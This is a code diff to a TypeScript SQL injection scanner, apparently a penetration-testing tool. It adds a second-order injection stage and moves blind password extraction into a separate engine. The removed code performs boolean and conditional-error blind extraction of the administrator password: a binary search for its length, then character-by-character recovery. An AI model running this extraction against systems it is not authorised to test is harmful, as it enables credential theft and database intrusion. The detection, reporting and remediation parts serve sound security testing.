@@ -43,6 +43,7 @@ import { ConcurrentExecutor } from './engine/ConcurrentExecutor';
 import { HypothesisEngine } from './engine/HypothesisEngine';
 import { CausalVerifier } from './engine/CausalVerifier';
 import { MultiplexedProbeEngine } from './engine/MultiplexedProbeEngine';
+import { ThreatConsequenceEngine } from './engine/ThreatConsequenceEngine';
 import { TernaryMetamorphicVerifier } from './engine/TernaryMetamorphicVerifier';
 import { AdaptiveRetryTree } from './engine/AdaptiveRetryTree';
 import { SQLDefenseLayerModel } from './engine/SQLDefenseLayerModel';
@@ -54,6 +55,7 @@ import { NegativeEvidenceCollector } from './engine/NegativeEvidenceCollector';
 import { PolyglotFingerprinter } from './engine/PolyglotFingerprinter';
 import { GhostNetwork } from './stealth/GhostNetwork';
 import { AdaptiveResponseOracle } from './engine/AdaptiveResponseOracle';
+import { BlindDataExtractor } from './engine/BlindDataExtractor';
 import { ModuleRegistry } from './modules/ModuleRegistry';
 import {
   ScanPipeline,
@@ -64,6 +66,7 @@ import {
   MultiOracleDiscoveryStage,
   CausalVerificationStage,
   GrayBoxStage,
+  SecondOrderStage,
   AdaptiveSchemaStage,
   VectorizedExtractionStage,
   EvidenceSynthesisStage,
@@ -668,6 +671,8 @@ export class SqlScanOrchestrator {
       },
       engineMode: this.engineMode,
       scanProfile: this.scanProfile,
+      concurrencyLimit: this.concurrentExecutor.getConcurrency(),
+      concurrentExecutor: this.concurrentExecutor,
     });
 
     if (this.isAborted) {
@@ -687,6 +692,7 @@ export class SqlScanOrchestrator {
         .addStage(new MultiOracleDiscoveryStage())
         .addStage(new CausalVerificationStage())
         .addStage(new GrayBoxStage())
+        .addStage(new SecondOrderStage())
         .addStage(new AdaptiveSchemaStage())
         .addStage(new VectorizedExtractionStage())
         .addStage(new EvidenceSynthesisStage());
@@ -1719,8 +1725,8 @@ export class SqlScanOrchestrator {
         this.onInvestigationNodes?.([...this.currentInvestigationNodes], [...this.currentInvestigationEdges]);
 
         if (this.safetyConfig.scanMode === 'quick') {
-          this.log('info', 'testing', `Quick Mode: Injection verified on "${param.name}". Fast-forwarding directly to Database Schema Extraction.`);
-          break;
+          this.log('info', 'testing', `Quick Mode: Injection verified on "${param.name}". Continuing to scan remaining parameters for comprehensive coverage.`);
+          // Don't break — continue scanning remaining parameters to find ALL injection points
         }
       } else if (!paramIsVulnerable) {
         this.negativeEvidence.addParameterizedProof(
@@ -2624,133 +2630,47 @@ export class SqlScanOrchestrator {
 
           // Boolean blind / conditional error fallback for entity/value extraction (when UNION didn't extract data)
           if ((!t.sampleRows || t.sampleRows.length === 0) && !this.isAborted) {
-            // Check for administrator entity
-            const adminProbes = adaptiveEngine.isConditionalErrorMode()
-              ? adaptiveEngine.generateConditionalErrorEntityProbe(t.name, `${userColName}='administrator'`)
-              : adaptiveEngine.generateEntityProbe(t.name, `${userColName}='administrator'`);
-            const adminRes = await this.executeProbe(parsed, confirmedInjectableParam, adminProbes.truePayload, true);
-            const adminExists = adaptiveEngine.classifyResponse(adminRes.body, adminRes.status) === 'TRUE';
+            const dbms = this.dbmsFingerprint.dbms !== 'Unknown' ? this.dbmsFingerprint.dbms : 'Generic SQL';
+            const effectiveTechnique = adaptiveEngine.isConditionalErrorMode()
+              ? 'CONDITIONAL_ERROR'
+              : this.findings.some((f) => f.injectionType === 'Time-based')
+              ? 'TIME'
+              : 'BOOLEAN';
 
-            if (adminExists) {
-              this.log('success', 'value_extraction', `✓ Entity "administrator" confirmed in ${t.name}.${userColName}`);
-              t.sampleRows = [{ [userColName]: 'administrator', [passColName]: '[Extracting...]' }];
-              t.sampleRowsStatus = 'ready';
-
-              // Emit catalog with entity confirmation
-              if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
-
-              // ─── Binary Search Password Length ─────────────────────────────
-              if (hasPassCol && !this.isAborted) {
-                this.log('info', 'value_extraction', `Binary searching ${passColName} length for administrator...`);
-                let low = 1;
-                let high = 50;
-                let passwordLength = 0;
-
-                while (low <= high && !this.isAborted) {
-                  const mid = Math.floor((low + high) / 2);
-                  const lenProbe = adaptiveEngine.isConditionalErrorMode()
-                    ? adaptiveEngine.generateConditionalErrorLengthProbe(t.name, passColName, `${userColName}='administrator'`, mid)
-                    : adaptiveEngine.generateLengthProbe(t.name, passColName, `${userColName}='administrator'`, mid);
-                  const lenRes = await this.executeProbe(parsed, confirmedInjectableParam, lenProbe, true);
-                  const lenClass = adaptiveEngine.classifyResponse(lenRes.body, lenRes.status);
-
-                  if (lenClass === 'TRUE') {
-                    low = mid + 1;
-                  } else {
-                    high = mid - 1;
-                  }
-                }
-
-                // At loop exit, `low` represents candidate length
-                const candidateLength = low;
-
-                // Verify candidate with exact equality probe (= candidateLength)
-                const exactProbe = adaptiveEngine.isConditionalErrorMode()
-                  ? adaptiveEngine.generateConditionalErrorExactLengthProbe(t.name, passColName, `${userColName}='administrator'`, candidateLength)
-                  : adaptiveEngine.generateExactLengthProbe(t.name, passColName, `${userColName}='administrator'`, candidateLength);
-                const exactRes = await this.executeProbe(parsed, confirmedInjectableParam, exactProbe, true);
-                if (adaptiveEngine.classifyResponse(exactRes.body, exactRes.status) === 'TRUE') {
-                  passwordLength = candidateLength;
-                } else {
-                  // Fallback checks for candidate - 1 and candidate + 1
-                  const prevProbe = adaptiveEngine.isConditionalErrorMode()
-                    ? adaptiveEngine.generateConditionalErrorExactLengthProbe(t.name, passColName, `${userColName}='administrator'`, candidateLength - 1)
-                    : adaptiveEngine.generateExactLengthProbe(t.name, passColName, `${userColName}='administrator'`, candidateLength - 1);
-                  const prevRes = await this.executeProbe(parsed, confirmedInjectableParam, prevProbe, true);
-                  if (adaptiveEngine.classifyResponse(prevRes.body, prevRes.status) === 'TRUE') {
-                    passwordLength = candidateLength - 1;
-                  } else {
-                    const nextProbe = adaptiveEngine.isConditionalErrorMode()
-                      ? adaptiveEngine.generateConditionalErrorExactLengthProbe(t.name, passColName, `${userColName}='administrator'`, candidateLength + 1)
-                      : adaptiveEngine.generateExactLengthProbe(t.name, passColName, `${userColName}='administrator'`, candidateLength + 1);
-                    const nextRes = await this.executeProbe(parsed, confirmedInjectableParam, nextProbe, true);
-                    if (adaptiveEngine.classifyResponse(nextRes.body, nextRes.status) === 'TRUE') {
-                      passwordLength = candidateLength + 1;
-                    } else {
-                      passwordLength = candidateLength;
-                    }
-                  }
-                }
-
-                if (passwordLength > 0) {
-                  this.log('success', 'value_extraction', `✓ Password length confirmed: ${passwordLength} characters`);
-
-                  // ─── Character-by-Character Extraction ─────────────────────────
-                  this.log('info', 'value_extraction', `Extracting ${passwordLength}-character password for administrator...`);
-                  const charset = AdaptivePayloadEngine.getExtractCharset();
-                  let extractedPassword = '';
-
-                  for (let pos = 1; pos <= passwordLength; pos++) {
-                    if (this.isAborted) break;
-                    this.updateProgress('value_extraction', `Extracting password char ${pos}/${passwordLength}`, 94 + Math.round((pos / passwordLength) * 4));
-
-                    let foundChar = '?';
-                    if (adaptiveEngine.isConditionalErrorMode()) {
-                      // High-performance binary search over ASCII range (32 to 126)
-                      let asciiLow = 32;
-                      let asciiHigh = 126;
-                      while (asciiLow < asciiHigh && !this.isAborted) {
-                        const mid = Math.floor((asciiLow + asciiHigh) / 2);
-                        const asciiProbe = adaptiveEngine.generateConditionalErrorAsciiProbe(
-                          t.name,
-                          passColName,
-                          `${userColName}='administrator'`,
-                          pos,
-                          mid
-                        );
-                        const aRes = await this.executeProbe(parsed, confirmedInjectableParam, asciiProbe, true);
-                        if (adaptiveEngine.classifyResponse(aRes.body, aRes.status) === 'TRUE') {
-                          asciiLow = mid + 1;
-                        } else {
-                          asciiHigh = mid;
-                        }
-                      }
-                      foundChar = String.fromCharCode(asciiLow);
-                    } else {
-                      for (const ch of charset) {
-                        if (this.isAborted) break;
-                        const charProbe = adaptiveEngine.generateCharProbe(t.name, passColName, `${userColName}='administrator'`, pos, ch);
-                        const charRes = await this.executeProbe(parsed, confirmedInjectableParam, charProbe, true);
-                        const charClass = adaptiveEngine.classifyResponse(charRes.body, charRes.status);
-
-                        if (charClass === 'TRUE') {
-                          foundChar = ch;
-                          break;
-                        }
-                      }
-                    }
-                    extractedPassword += foundChar;
-
-                    // Live update sample rows with partial extraction
-                    t.sampleRows = [{ [userColName]: 'administrator', [passColName]: extractedPassword + '·'.repeat(passwordLength - pos) }];
-                    if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
-                  }
-
-                  this.log('success', 'value_extraction', `✓ Password extracted: ${extractedPassword.length} characters recovered: "${extractedPassword}"`);
-                  t.sampleRows = [{ [userColName]: 'administrator', [passColName]: extractedPassword }];
+            const extractor = new BlindDataExtractor(
+              async (payload: string, append = true) => {
+                const res = await this.executeProbe(parsed, confirmedInjectableParam, payload, append);
+                return {
+                  body: res.body,
+                  status: res.status,
+                  durationMs: res.durationMs,
+                  rawRequest: res.rawRequest,
+                  rawResponse: res.rawResponse,
+                };
+              },
+              {
+                dbms,
+                technique: effectiveTechnique,
+                errorPolarity: 'error_on_true',
+                baselineStatus: 200,
+                baselineLength: 0,
+                concurrencyLimit: this.concurrentExecutor.getConcurrency() || 20,
+                isAborted: () => this.isAborted,
+                log: (lvl, msg) => this.log(lvl, 'value_extraction', msg),
+                onProgress: (colName, partialVal, pos, len) => {
+                  this.updateProgress('value_extraction', `Extracting ${colName} (${pos}/${len})`, 94 + Math.round((pos / len) * 5));
+                  t.sampleRows = [{ [userColName]: 'administrator', [colName]: partialVal }];
                   t.sampleRowsStatus = 'ready';
-                }
+                  if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
+                },
               }
+            );
+
+            const rowResult = await extractor.extractTableRow(t, 'administrator');
+            if (rowResult && Object.keys(rowResult).length > 0) {
+              t.sampleRows = [rowResult];
+              t.sampleRowsStatus = 'ready';
+              if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
             } else {
             this.log('info', 'value_extraction', `No "administrator" entity found in ${t.name}. Checking other common usernames...`);
 
@@ -2830,6 +2750,57 @@ export class SqlScanOrchestrator {
       if (soResult.isVulnerable) {
         this.updateCoverage('second_order', { status: 'vulnerable', testedCount: 1, positiveCount: 1, reason: soResult.evidence });
         this.log('success', 'second_order', `Second-Order SQL Injection confirmed: ${soResult.evidence}`);
+
+        const finding: SqlScanFinding = {
+          id: `finding-so-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`,
+          title: `Second-Order SQL Injection (${this.dbmsFingerprint.dbms || 'Generic SQL'})`,
+          parameterName: soParam.name,
+          parameterLocation: soParam.location,
+          url: this.target.url,
+          httpMethod: this.target.method,
+          dbms: this.dbmsFingerprint.dbms || 'Generic SQL',
+          detectionMethod: 'Asynchronous State Transition Invariant Oracle',
+          injectionType: 'Second-Order SQLi',
+          severity: 'High',
+          confidence: 'Confirmed',
+          confidenceScore: 95,
+          confidenceBreakdown: {
+            score: 95,
+            level: 'Confirmed',
+            factors: [
+              { name: 'Asynchronous State Transition Reflection', points: 95, description: soResult.evidence },
+            ],
+          },
+          evidence: [{
+            id: `ev-so-${Date.now()}`,
+            title: `Second-Order Execution Triggered`,
+            timestamp: Date.now(),
+            injectionType: 'Second-Order SQLi',
+            parameterName: soParam.name,
+            parameterLocation: soParam.location,
+            payload: soResult.evidence,
+            baselineStatus: 200,
+            baselineLength: 0,
+            baselineDurationMs: 0,
+            testStatus: 200,
+            testLength: 0,
+            testDurationMs: 0,
+            rawRequest: soResult.sourceRequest || '',
+            rawResponse: soResult.sourceResponse || '',
+            analysisSummary: `Second-order SQL injection execution confirmed across sink endpoint: ${soResult.evidence}`,
+          }],
+          reproductionRequest: soResult.sinkRequest || soResult.sourceRequest || '',
+          reproductionResponse: soResult.sinkResponse || soResult.sourceResponse || '',
+          remediation: 'Sanitize untrusted inputs at storage boundaries and use parameterized queries in all downstream sink queries.',
+          cwe: 'CWE-89',
+          owaspCategory: 'A03:2021-Injection',
+          timestamp: Date.now(),
+          sqliDetected: true,
+          sqlStructureControl: true,
+        };
+        ThreatConsequenceEngine.enrichFinding(finding, soParam);
+        this.findings.push(finding);
+        this.onFinding?.(finding);
       } else {
         this.updateCoverage('second_order', { status: 'passed', testedCount: 1, positiveCount: 0, reason: 'No second-order state reflection' });
       }
